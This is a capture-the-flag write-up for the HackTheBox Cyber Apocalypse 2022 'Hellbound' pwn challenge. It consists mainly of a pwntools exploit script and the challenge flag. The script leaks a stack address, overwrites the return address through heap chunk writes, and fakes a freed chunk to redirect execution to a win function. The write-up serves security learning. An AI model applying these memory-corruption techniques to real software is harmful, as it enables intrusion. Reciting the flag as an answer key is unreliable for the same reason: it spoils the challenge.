---
name: Hellbound (2022)
event: HackTheBox Cyber Apocalypse CTF 2022
category: Pwn
description: Writeup for Hellbound (Pwn) - HackTheBox Cyber Apocalypse CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Hellbound

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/U2OgL66-6BE/0.jpg)](https://youtu.be/U2OgL66-6BE "HTB Cyber Apocalypse CTF 2022: Hellbound")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './hellhound'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Leak stack (buffer) address
io.sendlineafter(b'>>', b'1')
io.recvuntil(b': [')
stack = int(io.recvline()[:-2], 10)
info("leaked stack address: %#x", stack)

# offset to return address = 80 = buffer (64 bytes) + menu_option (8 bytes) + canary (8 bytes)
ret = stack + 80
info("return address: %#x", ret)

# Write 8 bytes padding and return address to chunk
# The padding is because when we use option 3, the chunk pointer moves 8 bytes
io.sendlineafter(b'>>', b'2')
io.sendafter(b':', flat([0, ret]))

# Move chunk pointer forward 8 bytes, now it points to return address (stack_addr + 80)
io.sendlineafter(b'>>', b'3')

# Write the win() address to the chunk (overwriting return address)
# We also write 0x0 because we need a fake chunk to bypass the free()
# NOTE: 0x0 is because free(NULL) won't create error
io.sendlineafter(b'>>', b'2')
io.sendafter(b':', flat([elf.functions.berserk_mode_off, 0]))

# Move chunk pointer forward 8 bytes, now it points to our fake chunk
io.sendlineafter(b'>>', b'3')

# Call free(), followed by return (to our win() function)
io.sendlineafter(b'>>', b'69')

# Flag?
io.recvline()
warn(io.recv().decode())
```
{% endcode %}

Flag: `HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}`
